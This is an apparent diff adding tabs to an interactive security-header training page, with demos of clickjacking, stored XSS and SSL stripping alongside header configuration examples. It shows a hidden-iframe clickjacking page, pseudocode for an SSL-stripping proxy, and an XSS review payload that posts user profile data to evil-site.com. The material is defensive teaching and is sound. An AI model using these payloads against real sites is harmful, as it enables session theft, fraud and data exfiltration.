+        <div class="section">
+            <div class="mitigation-section">
+                <h4><span>🛡️</span> How to Protect Your Application</h4>
+                <div style="color:gray; font-size:small"> The examples below are just sample implementations. Modify these or create your own to fit your organization</div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Server Configuration</h5>
+                        <div class="code-block" data-label="Apache (.htaccess)">
+                        Header always set X-Content-Type-Options nosniff</div>
+                        
+                        <div class="code-block" data-label="Nginx">
+                        add_header X-Content-Type-Options nosniff;</div>
+                    </div>
+                    
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Application Code</h5>
+                        <div class="code-block" data-label="Express.js">
+                        app.use((req, res, next) => {
+                        res.header('X-Content-Type-Options', 'nosniff');
+                        next();
+                        });</div>
+                        
+                        <div class="code-block" data-label="Flask/Django">
+                        response.headers['X-Content-Type-Options'] = 'nosniff'</div>
+                    </div>
+                </div>
+
+                <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                    <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                    <ul style="color: #666; line-height: 2;">
+                        <li>✅ Set X-Content-Type-Options: nosniff on all responses</li>
+                        <li>✅ Validate file types on upload (don't trust extensions)</li>
+                        <li>✅ Use a Web Application Firewall</li>
+                        <li>✅ Use Content Security Policy as additional defense</li>
+                        <li>✅ Regularly scan for security headers with tools like securityheaders.com</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- Learning Path Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">➡️</span>
+                <h2 class="section-title">Keep Learning and Move Onto the Next Header</h2>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
+                <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); padding: 20px; border-radius: 10px; border: 2px solid #667eea;">
+                    <h4 style="color: #667eea; margin-bottom: 10px;">🖼️ X-Frame-Options</h4>
+                    <p style="color: #666; font-size: 0.9rem; margin-bottom: 15px;">See how attackers can hijack clicks and trick users, and learn how this header slams the door on frame-based exploits.</p>
+                    <button class="btn btn-primary" onclick="showTab('xfo')" style="font-size: 0.9rem;">Continue →</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<!-- X-FRAME-OPTIONS TAB CONTENT-->
+    <div id="xfo" class="tab-content">
+        <!-- Header Explanation -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🖼️</span>
+                <h2 class="section-title">Understanding X-Frame-Options</h2>
+            </div>
+            
+            <div class="intro-grid">
+                <div class="info-card">
+                    <h4>🎯 What It Does</h4>
+                    <p>Prevents your website from being embedded in frames or iframes on other domains. Controls whether browsers should allow your site to be displayed within frames, preventing clickjacking attacks.
+                    <br>What's an iframe? It's like a window within a window, where the content inside can come from the same site or a completely different one.
+                    <br>What's clickjacking? It's when an attacker tricks you into clicking something on a website that looks harmless, but secretly performs a dangerous action.
+                    </p>
+                </div>
+                <div class="info-card">
+                    <h4>⚠️ The Risk</h4>
+                    <p>Without this header, attackers can embed your site invisibly in their malicious pages, tricking users into clicking on your site while thinking they're interacting with the attacker's content.
+                    <br>Additionally, an attacker could do the opposite. They could copy your site within an iframe without doing any actual work to recreate the website from scratch. Then, create invisible inputs to trick user into submitting their credentials on what they think is the legitimate site when it's actually the attacker's site.
+                    </p>
+                </div>
+            </div>
+
+            <div class="code-block" data-label="HTTP Response Header">
+            X-Frame-Options: DENY
+            X-Frame-Options: SAMEORIGIN
+            X-Frame-Options: ALLOW-FROM https://trusted-site.com</div>
+        </div>
+
+        <!-- Real-World Scenario -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🏦</span>
+                <h2 class="section-title">Real-World Scenario: Online Banking Portal</h2>
+            </div>
+            
+            <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                Imagine <strong>SecureBank</strong> has an online banking portal where customers log in to check balances, transfer money, and manage accounts. The bank's website handles sensitive financial transactions and personal data.
+            </p>
+
+            <div class="info-card">
+                <h4>🎯 Legitimate Use Case</h4>
+                <p>Customers visit securebank.com directly to access their accounts, make transfers, and view statements. The banking interface should only appear on the bank's own domain to ensure security and user trust.</p>
+            </div>
+        </div>
+
+        <!-- Attack Scenario -->
+        <div class="section interactive-section">
+            <div class="section-header">
+                <span class="section-icon">🎭</span>
+                <h2 class="section-title">Interactive Demo: Clickjacking Attack</h2>
+            </div>
+
+            <div class="interactive-badge">
+                <span class="interactive-icon">🎮</span>
+                <span>Try the interactive clickjacking simulation below</span>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                An attacker creates a fake website (evil-site.com) that appears to offer amazing deals, but secretly the bank's transfer money page is placed over it.
+                <br><br>The bank's transfer amount input box and transfer submit button are lined up over the attacker's lucky number input and claim your prize button without the user knowing. 
+                <br><br>Users think they're entering their "lucky number guess" to win a prize, but are actually entering a transfer amount into the bank's hidden form.
+                <br><br>An example code snippet could look like what we have in the demo below.
+                <br><br>Our demo below will not do anything so malicious. Instead for demonstration purposes, you will enter a number and that number will appear within the alert as a proof of concept.
+            </p>
+
+            <div class="demo-container">
+                <h3 style="margin-bottom: 20px; color: #333;">🕸️ Clickjacking Attack Simulation</h3>
+                
+                <div class="upload-simulator" id="clickjackArea">
+                    <div class="file-icon">🎁</div>
+                    <h4>AMAZING PRIZE GIVEAWAY!</h4>
+                    <p style="color: #666; margin-top: 10px; margin-bottom: 15px;">Guess a number between 5000-10000 to win BIG!</p>
+                    
+                    <div class="prize-input-container">
+                        <label for="prizeGuess" style="display: block; margin-bottom: 8px; font-weight: 500; color: #333;">Enter your lucky number:</label>
+                        <input 
+                            type="number" 
+                            id="prizeGuess" 
+                            class="prize-input" 
+                            placeholder="Enter 5000-10000" 
+                            min="5000" 
+                            max="10000"
+                            style="width: 200px; padding: 10px; border: 2px solid #ddd; border-radius: 5px; text-align: center; font-size: 1.1rem; margin-bottom: 15px;"
+                        >
+                    </div>
+                    
+                    <div class="code-block" data-label="Malicious Website Code for evil-site.com" style="margin-top: 20px; text-align: left;">
+                    &lt;!-- Attacker's page: evil-site.com --&gt;
+                    <br>&lt;div style="position: relative;"&gt;
+                    <br>&lt;input placeholder="Enter your lucky number!"&gt;
+                    <br>&lt;button&gt;🎁 CLAIM YOUR PRIZE! 🎁&lt;/button&gt;
+                    <br>
+                    <br>&lt;!-- Hidden bank iframe positioned over the form --&gt;
+                    <br>&lt;iframe src="https://securebank.com/transfer?amount=${encodeURIComponent(inputValue)}"
+                    <br>        style="position: absolute; opacity: 0; 
+                    <br>                top: 0; left: 0; width: 100%; height: 100%"&gt;
+                    <br>&lt;/iframe&gt;
+                    <br>&lt;/div&gt;
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-danger" id="clickjackBtn" onclick="simulateClickjack()">
+                        🎁 Claim Your Prize! (Clickjacking Demo)
+                    </button>
+                    <button class="btn btn-danger" id="disableFrameBtn" onclick="toggleFrameProtection(false)" disabled>
+                        ⚠️ Disable Frame Protection
+                    </button>
+                    <button class="btn btn-primary" id="enableFrameBtn" onclick="toggleFrameProtection(true)">
+                        🛡️ Enable Frame Protection
+                    </button>
+                </div>
+
+                <div class="status-indicator" id="frameStatus">
+                    <span id="frameStatusIcon">🚨</span>
+                    <span id="frameStatusText">X-Frame-Options: DISABLED (Vulnerable)</span>
+                </div>
+
+                <div class="result-box result-info" id="frameResultBox">
+                    Enter a number and click "Claim Your Prize!" to see how clickjacking tricks users into unintended actions...
+                </div>
+
+                <div class="technical-details" id="frameTechnicalDetails" style="display: none;">
+                    <p class="technical-explanation" id="frameTechnicalExplanation">
+                        <!-- Technical details will be populated by JavaScript -->
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Impact Analysis -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">💥</span>
+                <h2 class="section-title">Real-World Impact</h2>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                Clickjacking attacks on financial institutions have caused massive damage. Here's what SecureBank could face:
+            </p>
+
+            <div class="impact-grid">
+                <div class="impact-card">
+                    <h5>💸 Unauthorized Transfers</h5>
+                    <p>Customers unknowingly authorize money transfers to attacker accounts, leading to direct financial theft and bank liability.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🔑 Account Compromises</h5>
+                    <p>Trick users into changing passwords, email addresses, or security settings, giving attackers full account control.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📋 Information Disclosure</h5>
+                    <p>Force users to share account details, balances, transaction history, and personal information with malicious sites.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>⚖️ Regulatory Violations</h5>
+                    <p>Banking regulators impose severe penalties for insufficient security controls - fines can reach millions of dollars.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🏛️ Trust Destruction</h5>
+                    <p>Customers lose faith in the bank's security, leading to account closures, negative publicity, and long-term reputation damage.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📊 Mass Exploitation</h5>
+                    <p>Attackers can scale clickjacking attacks to thousands of users simultaneously through social media and ad networks.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mitigation -->
+        <div class="section">
+            <div class="mitigation-section">
+                <h4><span>🛡️</span> How to Protect Your Application</h4>
+                <div style="color:gray; font-size:small"> The examples below are just sample implementations. Modify these or create your own to fit your organization</div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Server Configuration</h5>
+                        <div class="code-block" data-label="Apache (.htaccess)">
+                        Header always set X-Frame-Options DENY</div>
+                        
+                        <div class="code-block" data-label="Nginx">
+                        add_header X-Frame-Options SAMEORIGIN;</div>
+                    </div>
+                    
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Application Code</h5>
+                        <div class="code-block" data-label="Express.js">
+                        app.use((req, res, next) => {
+                        res.header('X-Frame-Options', 'DENY');
+                        next();
+                        });</div>
+                        
+                        <div class="code-block" data-label="Flask/Django">
+                        response.headers['X-Frame-Options'] = 'SAMEORIGIN'</div>
+                    </div>
+                </div>
+
+                <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                    <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                    <ul style="color: #666; line-height: 2;">
+                        <li>✅ Set X-Frame-Options: DENY for maximum protection</li>
+                        <li>✅ Use SAMEORIGIN only if you need to frame your own content</li>
+                        <li>✅ Consider upgrading to Content-Security-Policy: frame-ancestors</li>
+                        <li>✅ Test framing protection with browser dev tools</li>
+                        <li>✅ Monitor for attempts to bypass frame protection</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- Learning Path Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">➡️</span>
+                <h2 class="section-title">Keep Learning and Move Onto the Next Header</h2>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
+                <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); padding: 20px; border-radius: 10px; border: 2px solid #667eea;">
+                    <h4 style="color: #667eea; margin-bottom: 10px;">🔒 Content-Security-Policy</h4>
+                    <p style="color: #666; font-size: 0.9rem; margin-bottom: 15px;">See how rogue scripts sneak into trusted pages — and learn how this header locks down what your site can load, run, and trust.</p>
+                    <button class="btn btn-primary" onclick="showTab('csp')" style="font-size: 0.9rem;">Continue →</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<!-- CONTENT-SECURITY-POLICY TAB CONTENT-->
+    <div id="csp" class="tab-content">
+        <!-- Header Explanation -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🔒</span>
+                <h2 class="section-title">Understanding Content-Security-Policy</h2>
+            </div>
+            
+            <div class="intro-grid">
+                <div class="info-card">
+                    <h4>🎯 What It Does</h4>
+                    <p>Controls which resources (scripts, stylesheets, images) can be loaded and executed on your webpage. Acts as a powerful defense against Cross-Site Scripting (XSS) attacks by creating an allowlist of trusted sources.
+                    <br>What's XSS? It's when an attacker injects malicious scripts into your website that then execute in other users' browsers.
+                    <br>Content-Security-Policy (CSP) works by telling the browser "only execute scripts from these specific, trusted sources" and blocks everything else.
+                    </p>
+                </div>
+                <div class="info-card">
+                    <h4>⚠️ The Risk</h4>
+                    <p>Without CSP, any JavaScript code can execute on your site - whether from your own scripts, third-party libraries, or malicious code injected by attackers through vulnerabilities.
+                    <br>Even a single XSS vulnerability can lead to complete account takeover, data theft, and malware distribution to your users.
+                    </p>
+                </div>
+            </div>
+
+            <div class="code-block" data-label="HTTP Response Header">
+            Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'</div>
+        </div>
+
+        <!-- Real-World Scenario -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🛍️</span>
+                <h2 class="section-title">Real-World Scenario: E-Commerce Platform</h2>
+            </div>
+            
+            <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                Imagine <strong>ShopSecure</strong> is an e-commerce platform where customers browse products, make purchases, and save payment information. The site includes user reviews, product search, and a customer support chat system.
+            </p>
+
+            <div class="info-card">
+                <h4>🎯 Legitimate Use Case</h4>
+                <p>Customers write product reviews, search for items, and interact with customer support. The site loads scripts for analytics, payment processing, and chat functionality from trusted domains.</p>
+            </div>
+        </div>
+
+        <!-- Attack Scenario -->
+        <div class="section interactive-section">
+            <div class="section-header">
+                <span class="section-icon">🎭</span>
+                <h2 class="section-title">Interactive Demo: XSS Attack via Stored Script</h2>
+            </div>
+
+            <div class="interactive-badge">
+                <span class="interactive-icon">🎮</span>
+                <span>Try the interactive XSS simulation below</span>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                An attacker discovers the product review system doesn't properly sanitize input. 
+                <br><br>They submit a "review" that contains malicious JavaScript. 
+                
+                <div class="code-block" data-label="What Users See" style="margin-top: 20px; text-align: left;">
+                ★★★★★ Great headphones! Amazing sound quality and comfortable fit.
+                </div>
+                
+                <p style="margin-bottom: 20px; color: #666;">
+                When other customers view this product, the malicious script executes in their browsers.
+                </p>
+
+                <div class="code-block" data-label="What's Actually Submitted" style="margin-top: 20px; text-align: left;">
+                ★★★★★ Great headphones! &lt;script&gt;
+                <br>// Steal user data and send to attacker's server
+                <br>fetch('/api/user/profile').then(r=&gt;r.json()).then(data=&gt;
+                <br>fetch('http://evil-site.com/steal', {
+                <pre>    method: 'POST',</pre> 
+                <pre>    body: JSON.stringify(data)</pre>
+                })
+                <br>);
+                <br>&lt;/script&gt; Amazing sound quality and comfortable fit.
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                Our demo below will not do anything so malicious. Instead for demonstration purposes, it will simply pop an alert as a proof of concept.
+                </p>
+            </p>
+
+            <div class="demo-container">
+                <h3 style="margin-bottom: 20px; color: #333;">💬 Product Review System Simulation</h3>
+                
+                <div class="upload-simulator" id="cspArea">
+                    <div class="file-icon">⭐</div>
+                    <h4>Malicious Product Review</h4>
+                    <p style="color: #666; margin-top: 10px;">An attacker submits what appears to be a legitimate review but contains malicious JavaScript</p>
+                    
+                    <div class="code-block" data-label="Malicious Review" style="margin-top: 20px; text-align: left;">
+                    ★★★★★ Great headphones! Amazing sound quality and comfortable fit.
+                    <br>&lt;script&gt;
+                    <br>alert('🚨 XSS ATTACK SIMULATED!\n\nThe malicious script in the review just executed!\n\nIn reality, this would:\n• Steal user login sessions\n• Extract personal and payment data\n• Redirect to malware sites\n• Happen silently to every user who views this review');
+                    <br>&lt;/script&gt;
+                    <br>Amazing sound quality and comfortable fit.
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-danger" id="submitReviewBtn" onclick="simulateXSS()">
+                        👁️ View Malicious Review (Simulate XSS)
+                    </button>
+                    <button class="btn btn-danger" id="disableCSPBtn" onclick="toggleCSPProtection(false)" disabled>
+                        ⚠️ Disable CSP Protection
+                    </button>
+                    <button class="btn btn-primary" id="enableCSPBtn" onclick="toggleCSPProtection(true)">
+                        🛡️ Enable CSP Protection
+                    </button>
+                </div>
+
+                <div class="status-indicator" id="cspStatus">
+                    <span id="cspStatusIcon">🚨</span>
+                    <span id="cspStatusText">Content-Security-Policy: DISABLED (Vulnerable)</span>
+                </div>
+
+                <div class="result-box result-info" id="cspResultBox">
+                    Enter a review and click "Submit Review" to see how XSS attacks work...
+                </div>
+
+                <div class="technical-details" id="cspTechnicalDetails" style="display: none;">
+                    <p class="technical-explanation" id="cspTechnicalExplanation">
+                        <!-- Technical details will be populated by JavaScript -->
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Impact Analysis -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">💥</span>
+                <h2 class="section-title">Real-World Impact</h2>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                XSS attacks on e-commerce platforms can devastate both the business and its customers:
+            </p>
+
+            <div class="impact-grid">
+                <div class="impact-card">
+                    <h5>💳 Payment Data Theft</h5>
+                    <p>Steal credit card information, billing addresses, and payment methods during checkout processes.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🔑 Account Takeovers</h5>
+                    <p>Hijack user sessions to make unauthorized purchases, change account details, and access order history.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🎣 Credential Harvesting</h5>
+                    <p>Create fake login forms to capture usernames and passwords for the site and other services.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🦠 Malware Distribution</h5>
+                    <p>Redirect users to malicious sites or trigger drive-by downloads of malware and ransomware.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📊 Mass Data Breach</h5>
+                    <p>Extract customer databases, order histories, and personal information affecting thousands of users.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🏪 Business Destruction</h5>
+                    <p>Regulatory fines, customer lawsuits, payment processor bans, and permanent reputation damage.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mitigation -->
+        <div class="section">
+            <div class="mitigation-section">
+                <h4><span>🛡️</span> How to Protect Your Application</h4>
+                <div style="color:gray; font-size:small"> The examples below are just sample implementations. Modify these or create your own to fit your organization</div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Basic CSP Implementation</h5>
+                        <div class="code-block" data-label="Strict CSP (Recommended)">
+                        Content-Security-Policy: default-src 'self'; 
+                        script-src 'self'; 
+                        style-src 'self' 'unsafe-inline'; 
+                        img-src 'self' data: https:;</div>
+                        
+                        <div class="code-block" data-label="Express.js Implementation">
+                        app.use((req, res, next) => {
+                        res.setHeader('Content-Security-Policy', 
+                            "default-src 'self'; script-src 'self'");
+                        next();
+                        });</div>
+                    </div>
+                    
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Advanced CSP Features</h5>
+                        <div class="code-block" data-label="Nonce-based CSP">
+                        Content-Security-Policy: script-src 'nonce-abc123'
+                        
+                        &lt;script nonce="abc123"&gt;
+                        // Only this script will execute
+                        &lt;/script&gt;</div>
+                        
+                        <div class="code-block" data-label="Report-Only Mode">
+                        Content-Security-Policy-Report-Only: 
+                        default-src 'self'; report-uri /csp-report</div>
+                    </div>
+                </div>
+
+                <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                    <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                    <ul style="color: #666; line-height: 2;">
+                        <li>✅ Start with CSP in report-only mode to identify issues</li>
+                        <li>✅ Use 'self' as the default source for maximum security</li>
+                        <li>✅ Avoid 'unsafe-inline' and 'unsafe-eval' whenever possible</li>
+                        <li>✅ Implement nonce or hash-based CSP for inline scripts</li>
+                        <li>✅ Regularly review CSP reports and update policies</li>
+                        <li>✅ Test CSP thoroughly across all site functionality</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- Learning Path Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">➡️</span>
+                <h2 class="section-title">Keep Learning and Move Onto the Next Header</h2>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
+                <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); padding: 20px; border-radius: 10px; border: 2px solid #667eea;">
+                    <h4 style="color: #667eea; margin-bottom: 10px;">🔐 Strict-Transport-Security</h4>
+                    <p style="color: #666; font-size: 0.9rem; margin-bottom: 15px;">See how attackers exploit insecure redirects, and learn how this header forces browsers to stick to HTTPS, no exceptions, no excuses.</p>
+                    <button class="btn btn-primary" onclick="showTab('hsts')" style="font-size: 0.9rem;">Continue →</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<!-- HSTS TAB CONTENT-->
+    <div id="hsts" class="tab-content">
+        <!-- Header Explanation -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🔐</span>
+                <h2 class="section-title">Understanding HTTP Strict Transport Security (HSTS)</h2>
+            </div>
+            
+            <div class="intro-grid">
+                <div class="info-card">
+                    <h4>🎯 What It Does</h4>
+                    <p>Forces browsers to only connect to your website using HTTPS (secure connections) and prevents downgrades to insecure HTTP. Once a browser sees this header, it remembers to always use HTTPS for your site.
+                    <br>What's the difference? HTTP sends data in plain text that anyone can read, while HTTPS encrypts everything.
+                    <br>HSTS works by telling the browser "never connect to this site over insecure HTTP again, even if the user types http://"
+                    </p>
+                </div>
+                <div class="info-card">
+                    <h4>⚠️ The Risk</h4>
+                    <p>Without HSTS, attackers can intercept your connection and downgrade it from secure HTTPS to insecure HTTP, allowing them to steal passwords, session cookies, and personal data.
+                    <br>Attackers can also create fake HTTP versions of websites to capture login credentials and sensitive information.
+                    </p>
+                </div>
+            </div>
+
+            <div class="code-block" data-label="HTTP Response Header">
+            Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</div>
+        </div>
+
+        <!-- Real-World Scenario -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">☕</span>
+                <h2 class="section-title">Real-World Scenario: Coffee Shop WiFi Attack</h2>
+            </div>
+            
+            <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                Imagine you're at <strong>CaféConnect</strong>, a popular coffee shop with free WiFi. You want to check your online banking while enjoying your latte. The bank's website should always use HTTPS to protect your financial data.
+            </p>
+
+            <div class="info-card">
+                <h4>🎯 Legitimate Use Case</h4>
+                <p>Customers connect to trusted-bank.com using HTTPS to securely access their accounts. All login credentials and financial data should be encrypted during transmission.</p>
+            </div>
+        </div>
+
+        <!-- Attack Scenario -->
+        <div class="section interactive-section">
+            <div class="section-header">
+                <span class="section-icon">🎭</span>
+                <h2 class="section-title">Interactive Demo: SSL Stripping Attack</h2>
+            </div>
+
+            <div class="interactive-badge">
+                <span class="interactive-icon">🎮</span>
+                <span>Try the interactive SSL stripping simulation below</span>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                An attacker sets up a rogue WiFi hotspot called "Free_CafeWiFi" or compromises the legitimate network. When you try to visit your bank's website, the attacker intercepts your connection and strips away the HTTPS encryption.
+                <br><br>What you think you're connecting to:
+                
+                <div class="code-block" data-label="What Users Expect" style="margin-top: 20px; text-align: left;">
+                🔒 https://trusted-bank.com/login
+                ✅ Secure connection with encryption
+                </div>
+                
+                <p style="margin-bottom: 20px; color: #666;">
+                What the attacker redirects you to:
+                </p>
+
+                <div class="code-block" data-label="What Actually Happens" style="margin-top: 20px; text-align: left;">
+                ⚠️ http://trusted-bank.com/login
+                ❌ Insecure connection - no encryption
+                <br>
+                OR even worse:
+                <br>
+                ⚠️ http://trusted-bank.evil-site.com/login
+                ❌ Fake site controlled by attacker
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                Our demo below will simulate this attack by showing you what happens when HSTS protection is missing versus when it's enabled.
+                </p>
+            </p>
+
+            <div class="demo-container">
+                <h3 style="margin-bottom: 20px; color: #333;">📱 Banking Login Simulation</h3>
+                
+                <div class="upload-simulator" id="hstsArea">
+                    <div class="file-icon">🏦</div>
+                    <h4>Trusted Bank Login</h4>
+                    <p style="color: #666; margin-top: 10px;">Attempting to connect to your bank's website...</p>
+                    
+                    <div class="code-block" data-label="Attacker's SSL Stripping Code" style="margin-top: 20px; text-align: left;">
+                    # Attacker's proxy server intercepts traffic
+                    <br>if request.url.startswith('https://trusted-bank.com'):
+                    <br>    # Strip HTTPS and redirect to HTTP
+                    <br>    redirect_to = request.url.replace('https://', 'http://')
+                    <br>    return redirect(redirect_to)
+                    <br>    
+                    <br># Victim now connects over unencrypted HTTP
+                    <br># Attacker can read all login credentials
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-danger" id="connectBankBtn" onclick="simulateSSLStrip()">
+                        🔗 Connect to Bank (Simulate Attack)
+                    </button>
+                    <button class="btn btn-danger" id="disableHSTSBtn" onclick="toggleHSTSProtection(false)" disabled>
+                        ⚠️ Disable HSTS Protection
+                    </button>
+                    <button class="btn btn-primary" id="enableHSTSBtn" onclick="toggleHSTSProtection(true)">
+                        🛡️ Enable HSTS Protection
+                    </button>
+                </div>
+
+                <div class="status-indicator" id="hstsStatus">
+                    <span id="hstsStatusIcon">🚨</span>
+                    <span id="hstsStatusText">Strict-Transport-Security: DISABLED (Vulnerable)</span>
+                </div>
+
+                <div class="result-box result-info" id="hstsResultBox">
+                    Click "Connect to Bank" to see how SSL stripping attacks work...
+                </div>
+
+                <div class="technical-details" id="hstsTechnicalDetails" style="display: none;">
+                    <p class="technical-explanation" id="hstsTechnicalExplanation">
+                        <!-- Technical details will be populated by JavaScript -->
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Impact Analysis -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">💥</span>
+                <h2 class="section-title">Real-World Impact</h2>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                SSL stripping attacks in public WiFi environments can compromise any sensitive website:
+            </p>
+
+            <div class="impact-grid">
+                <div class="impact-card">
+                    <h5>🏦 Banking Theft</h5>
+                    <p>Steal online banking credentials, account numbers, and transaction details leading to direct financial theft.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📧 Email Compromise</h5>
+                    <p>Capture email login credentials to access personal messages, contacts, and use accounts for further attacks.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🔑 Identity Theft</h5>
+                    <p>Harvest social security numbers, addresses, and personal information for identity theft and fraud.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>💼 Corporate Espionage</h5>
+                    <p>Intercept business communications, trade secrets, and confidential documents in corporate environments.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🛒 Shopping Fraud</h5>
+                    <p>Steal credit card information and shopping account credentials for unauthorized purchases.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📱 Social Media Takeover</h5>
+                    <p>Compromise social media accounts to spread malware, scams, and damage personal reputation.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mitigation -->
+        <div class="section">
+            <div class="mitigation-section">
+                <h4><span>🛡️</span> How to Protect Your Application</h4>
+                <div style="color:gray; font-size:small"> The examples below are just sample implementations. Modify these or create your own to fit your organization</div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Basic HSTS Implementation</h5>
+                        <div class="code-block" data-label="Strict HSTS (Recommended)">
+                        Strict-Transport-Security: max-age=31536000; 
+                        includeSubDomains; preload</div>
+                        
+                        <div class="code-block" data-label="Express.js Implementation">
+                        app.use((req, res, next) => {
+                        res.setHeader('Strict-Transport-Security', 
+                            'max-age=31536000; includeSubDomains; preload');
+                        next();
+                        });</div>
+                    </div>
+                    
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Advanced HSTS Configuration</h5>
+                        <div class="code-block" data-label="Apache Configuration">
+                        Header always set Strict-Transport-Security 
+                        "max-age=63072000; includeSubDomains; preload"</div>
+                        
+                        <div class="code-block" data-label="Nginx Configuration">
+                        add_header Strict-Transport-Security 
+                        "max-age=31536000; includeSubDomains; preload" always;</div>
+                    </div>
+                </div>
+
+                <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                    <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                    <ul style="color: #666; line-height: 2;">
+                        <li>✅ Set max-age to at least 1 year (31536000 seconds)</li>
+                        <li>✅ Include includeSubDomains to protect all subdomains</li>
+                        <li>✅ Add preload directive and submit to HSTS preload list</li>
+                        <li>✅ Test HSTS with tools like ssllabs.com</li>
+                        <li>✅ Ensure all resources load over HTTPS before enabling</li>
+                        <li>✅ Monitor for mixed content warnings</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- Learning Path Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">➡️</span>
+                <h2 class="section-title">Keep Learning and Move Onto the Next Header</h2>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
+                <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); padding: 20px; border-radius: 10px; border: 2px solid #667eea;">
+                    <h4 style="color: #667eea; margin-bottom: 10px;">🔗 Referrer-Policy</h4>
+                    <p style="color: #666; font-size: 0.9rem; margin-bottom: 15px;">See how URLs can leak sensitive paths to third parties, and learn how this header controls what your site reveals, and to whom.</p>
